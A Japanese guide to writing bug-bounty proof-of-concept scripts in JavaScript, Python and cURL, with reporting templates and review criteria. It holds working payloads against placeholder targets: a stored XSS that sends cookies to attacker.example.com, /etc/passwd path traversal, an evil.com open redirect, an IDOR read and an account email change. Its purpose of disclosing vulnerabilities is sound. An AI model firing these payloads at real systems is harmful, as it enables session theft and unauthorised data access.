# PoC スクリプト設計ガイド（JavaScript / Python / cURL）

PoC（Proof of Concept）は「発見した脆弱性が実際に悪用可能であることを証明する再現コード」。トリアージャーの手元で**コマンド一発で再現できる**形を目指す。

レビュー時は、ユーザーの PoC スクリプトをこのガイドの **5 原則** で評価する。

---

## なぜ PoC スクリプトを用意するか

Burp Suite のログをそのまま貼るのではなく、**JS / Python の独立したスクリプト**を提供する戦略的理由：

### 1. 開発者はトリアージツールに慣れていないことが多い
- 「Burp の Repeater でこのリクエストを送って」は開発者に不慣れなツールの学習コストを強いる
- スクリプトなら開発者は手元のターミナルでコマンド 1 つ

### 2. 動かぬ証拠としての説得力
- 「他人のセッションを奪う流れを自動化」して見せれば、実在する脅威としての説得力
- 「このスクリプトを実行すると DB の全ユーザー名が表示される」は言葉の数倍強い

### 3. テストコードへの転用
- PoC スクリプトはそのまま「修正後の回帰テスト」として使える
- 開発者にとっての価値が一段上がる

### 4. 環境依存の排除
- Burp ログにはあなたのブラウザ特有のヘッダ・Cookie が大量に含まれ、開発者環境で動かないことがある
- `requests` ライブラリで「攻撃に本当に必要なデータ」だけを抽出すれば再現失敗を防げる

---

## PoC スクリプト 5 原則

レビュー時にこの 5 つを満たしているか確認する。

### 1. 無害性
- ❌ `rm -rf /` のような破壊的コマンド
- ❌ 実在する他人のデータの抽出（プログラム規約違反）
- ❌ リバースシェル取得、永続化スクリプト
- ✅ `id`、`whoami`、`hostname`、DNS コールバック程度に留める
- ✅ 自分の 2 つのテストアカウント間でのみ動かす

### 2. 最小性
- 必要最低限のコード
- 余計なヘッダ（トラッキング Cookie 30 個 など）は削除
- 攻撃に「本当に必要なデータ」だけを抽出して抽象化

### 3. 明確性
- 実行結果から脆弱性成立の判定軸が明確（成功/失敗が分岐ロジックで分かる）
- 「[+] Vulnerability Confirmed」「[-] Not vulnerable」のように出力で判定
- 修正前/修正後で挙動の違いが見える

### 4. 自己完結性
- 標準ライブラリのみで動くのが理想（`requests` / `urllib` 等）
- 別途必要なライブラリがある場合はインストール手順を併記
- 特殊な環境設定（カスタム CA 証明書、特定 OS 限定等）は明記

### 5. スクリプトとペイロードの分離
- ペイロードは識別しやすい変数名（`XSS_PAYLOAD`、`SQL_PAYLOAD`、`PATH_TRAVERSAL` 等）に格納
- 攻撃手順としてのスクリプト本体と、ペイロードそのものが視覚的に分離

---

## タイプ別の推奨形式

| 脆弱性の種類 | 推奨形式 | 理由 |
|---|---|---|
| **XSS** | JavaScript | ユーザーのブラウザ上でスクリプトが動くことが本質 |
| **CSRF** | JavaScript（HTML フォーム） | 被害者ブラウザでの動作再現 |
| **SQLi / RCE** | Python | サーバ側の挙動（データ取得・コマンド実行）を客観的に示す |
| **パストラバーサル** | Python or cURL | URL ベースで完結する場合は cURL |
| **IDOR / 認可不備** | Python | 「A の Cookie を使って B のデータを取る」比較がコードで示せる |
| **シンプルな URL ベース攻撃** | cURL | ワンライナーで完結 |
| **SSRF** | Python (リスナー併設) | コールバックの確認が必要 |

---

## ① JavaScript PoC（DevTools コンソール実行）

### 主な用途
- JavaScript が実行されることの証明（`alert(origin)`）
- ログイン後の画面でしか起きない挙動の検証（セッション維持）
- CSRF / DOM ベース攻撃の再現

### テンプレート（雛形）
```javascript
// グローバルスコープを汚さない即時実行関数で囲む
(async () => {
  const TARGET = "https://app.example.com";
  const PAYLOAD = "<img src=x onerror=alert(origin)>";

  // 1. 攻撃の準備（ペイロードを脆弱な箇所に投入）
  const setRes = await fetch(`${TARGET}/api/profile`, {
    method: "PUT",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ bio: PAYLOAD }),
  });
  console.log("[*] Payload set:", setRes.status);

  // 2. 攻撃の実行（脆弱な画面を開く）
  window.location.href = `${TARGET}/profile`;
})();
```

### 例：Stored XSS
```javascript
(async () => {
  const TARGET = "https://app.example.com";
  const XSS_PAYLOAD = '<img src=x onerror="fetch(`https://attacker.example.com/c/${encodeURIComponent(document.cookie)}`)">';

  await fetch(`${TARGET}/pages/new`, {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      subject: "PoC Test",
      html_body: XSS_PAYLOAD,
      text_body: "PoC Test"
    }),
  });
  console.log("[+] Payload stored. Visit /pages/ as victim to trigger.");
  window.location.href = `${TARGET}/pages/`;
})();
```

### 再現手順の書き方
```markdown
1. URL `https://app.example.com/login` に攻撃者アカウントでログインします。
2. ブラウザの DevTools を開き、以下の JavaScript PoC をコンソールタブから
   実行します。なお、以下のコードは XSS ペイロードを含むページを作成し、
   そのページに遷移するものです。

   ```javascript
   (async () => { ... })();
   ```

3. ブラウザ上で `alert(origin)` が実行され、現在のオリジンを示す
   アラートダイアログが表示されることを確認します。
   - スクリーンショット: `xss-alert.png`
```

---

## ② Python PoC（ターミナル実行）

### 主な用途
- 複雑なペイロード（バイナリ送信、多段エスケープ）
- 認可不備の検証で複数 Cookie を切り替え
- ログイン後の画面でしか動かない挙動をセッション維持で検証
- SQLi / RCE / パストラバーサル

### テンプレート（雛形）
```python
#!/usr/bin/env python3
"""
PoC: <Vulnerability Type> in <Target>
Usage: python poc.py
Requires: requests (pip install requests)
"""
import requests
import sys

TARGET = "https://app.example.com"
ATTACKER_COOKIE = "session=<paste-attacker-session>"
PAYLOAD = "<paste-payload>"  # 必ず変数で分離


def prove_vulnerability() -> bool:
    print(f"[*] Testing on: {TARGET}")
    try:
        with requests.Session() as s:
            r = s.get(
                f"{TARGET}/api/vulnerable-endpoint",
                params={"q": PAYLOAD},
                headers={"Cookie": ATTACKER_COOKIE},
                timeout=10,
            )
        # 成功判定軸を明確にする
        if r.status_code == 200 and "<expected-marker>" in r.text:
            print("[+] Vulnerability Confirmed!")
            print(f"[+] Response Snippet: {r.text[:200]}...")
            return True
        else:
            print(f"[-] Not vulnerable (status={r.status_code})")
            return False
    except requests.RequestException as e:
        print(f"[!] Connection error: {e}")
        return False


if __name__ == "__main__":
    sys.exit(0 if prove_vulnerability() else 1)
```

### 例：パストラバーサル
```python
#!/usr/bin/env python3
import requests, sys

TARGET = "https://app.example.com/api/download"
PATH_TRAVERSAL = "../../../etc/passwd"

def prove():
    print(f"[*] Testing path traversal on: {TARGET}")
    r = requests.get(TARGET, params={"file": PATH_TRAVERSAL}, timeout=10)
    if r.status_code == 200 and "root:x:" in r.text:
        print("[+] Path traversal confirmed: /etc/passwd accessible")
        print(f"    First line: {r.text.splitlines()[0]}")
        return True
    print(f"[-] Not vulnerable (status={r.status_code})")
    return False

if __name__ == "__main__":
    sys.exit(0 if prove() else 1)
```

### 例：IDOR（2 アカウント比較）
```python
#!/usr/bin/env python3
import requests, sys

TARGET = "https://app.example.com/api/v2/users/{uid}"

ATTACKER_SESSION = "<attacker-session>"
ATTACKER_UID     = 99001
VICTIM_UID       = 99002

def prove():
    s = requests.Session()
    s.headers.update({"Cookie": f"session={ATTACKER_SESSION}"})

    # 1. 自分のデータ取得（baseline）
    own = s.get(TARGET.format(uid=ATTACKER_UID), timeout=10)
    print(f"[*] Own data status: {own.status_code}")

    # 2. 他人のデータ取得（IDOR の検証）
    other = s.get(TARGET.format(uid=VICTIM_UID), timeout=10)
    print(f"[*] Other user's data status: {other.status_code}")

    # 3. 認可境界の判定
    if other.status_code == 200 and str(VICTIM_UID) in other.text:
        print("[+] IDOR confirmed: attacker can read victim's data")
        return True
    print("[-] Authorization boundary holds.")
    return False

if __name__ == "__main__":
    sys.exit(0 if prove() else 1)
```

### 再現手順の書き方
```markdown
1. ターミナルで以下のコマンドを実行します。

   ```bash
   pip install requests
   python poc.py
   ```

2. 標準出力に `[+] IDOR confirmed: attacker can read victim's data`
   と表示されることを確認します。
   - スクリーンショット: `poc-output.png`
```

---

## ③ cURL ワンライナー

### 主な用途
- URL ベースで完結する単純な攻撃
- パストラバーサル、Open Redirect、認証バイパスのうち URL 操作で済むもの

### 例
```bash
# パストラバーサル
curl "https://app.example.com/api/download?file=../../../etc/passwd"

# Open Redirect
curl -i "https://app.example.com/redirect?url=//evil.com"

# Cookie 必要な場合
curl -H "Cookie: session=<attacker-session>" \
     -X PATCH \
     -H "Content-Type: application/json" \
     -d '{"email":"pwned@evil.com"}' \
     "https://api.example.com/v2/users/99002/email"
```

### Tips
- `-i` で HTTP ヘッダも表示
- `-v` で詳細トレース
- `-k` を使うのは自己署名証明書のテスト環境のみ。プロダクションでは指摘事項として書く

---

## 共通：ペイロード変数の命名規則

| 脆弱性 | 推奨変数名 |
|---|---|
| XSS | `XSS_PAYLOAD`, `XSS_VECTOR` |
| SQLi | `SQL_PAYLOAD`, `SQLI_QUERY` |
| RCE | `RCE_COMMAND`, `OS_CMD` |
| Path Traversal | `PATH_TRAVERSAL`, `LFI_PATH` |
| SSRF | `SSRF_TARGET`, `INTERNAL_URL` |
| XXE | `XXE_PAYLOAD`, `MALICIOUS_DTD` |
| CSRF | `CSRF_FORM_HTML` |
| Deserialization | `SERIALIZED_PAYLOAD` |

---

## レビュー時の出力例（PoC スクリプトに対する指摘）

```markdown
### 5. PoC (8/12)

**良い点**:
- Python の `requests` ベースで自己完結している
- ペイロードが `XSS_PAYLOAD` 変数に分離されている

**問題点**:
- 成功判定が `r.status_code == 200` だけ。これだとサーバが常に 200 を返す
  場合に誤検知する。レスポンス本文に脆弱性の証跡（反射されたペイロード等）
  が含まれているかも確認すべき。
- 標準出力に「攻撃者の本物のセッション値」が含まれている。`<masked>` に
  置き換えて公開可能な状態にする。
- インストール手順（`pip install requests`）の記載がない。

**直し方（具体例）**:
```python
# 成功判定を強化
EXPECTED_MARKER = '<img src=x onerror='
if r.status_code == 200 and EXPECTED_MARKER in r.text:
    print("[+] XSS confirmed: payload reflected into response")
```
```
